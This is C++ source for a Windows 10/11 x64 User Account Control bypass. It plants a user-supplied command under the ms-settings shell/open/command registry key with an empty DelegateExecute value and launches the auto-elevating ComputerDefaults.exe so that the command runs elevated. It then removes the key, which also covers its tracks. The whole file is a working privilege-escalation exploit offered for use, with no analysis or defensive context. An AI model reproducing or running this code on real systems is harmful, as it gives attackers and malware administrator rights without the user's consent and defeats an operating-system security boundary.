/* Bypass UAC on Windows 10/11 x64 using ms-settings DelegateExecute registry key. 
*/
#include <iostream>
#include <Windows.h>
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Shell32.lib")

int main(int argc, char* argv[]) {
    LPWSTR pCMDpath;
    size_t sSize;
    if (argc != 2) {
        printf("[!] Error, you must supply a command\n");
        return EXIT_FAILURE;
    }
#ifdef _WIN64 // x64 ONLY!
    pCMDpath = new TCHAR[MAX_PATH + 1];
    mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], MAX_PATH);
    LRESULT lResult;
    BOOL bResult;
    HKEY hKey = NULL;
    WCHAR szTempBuffer[MAX_PATH + 1];
    DWORD dwData;
    SIZE_T cmdLen;
    SHELLEXECUTEINFO shinfo;
    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
    if (lResult != ERROR_SUCCESS)
        return -1;
    szTempBuffer[0] = 0;
    dwData = 0;
    lResult = RegSetValueEx(hKey,L"DelegateExecute", 0, REG_SZ, (BYTE*)szTempBuffer, dwData);
    if (lResult != ERROR_SUCCESS)
        return -1;
    cmdLen = lstrlen(pCMDpath);
    dwData = (DWORD)((1 + cmdLen) * sizeof(WCHAR));
    lResult = RegSetValueEx(hKey,TEXT(""),0, REG_SZ, (BYTE*)pCMDpath,dwData);
    if (lResult == ERROR_SUCCESS) {
        // can pick either fodhelper.exe or computerdefaults.exe here
        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = L"C:\\Windows\\System32\\ComputerDefaults.exe";
        shinfo.lpParameters = L""; // parameters
        shinfo.lpDirectory = NULL;
        shinfo.nShow = SW_SHOW;
        shinfo.lpVerb = NULL;
        bResult = ShellExecuteEx(&shinfo);
        if (bResult) {
            WaitForSingleObject(shinfo.hProcess, 0x8000);
            CloseHandle(shinfo.hProcess);
            printf("[+] Success\n");
        }
    }
    if (RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command")) {
        return -1;
    }
    if (hKey != NULL)
        RegCloseKey(hKey);
#endif
    return EXIT_SUCCESS;
}

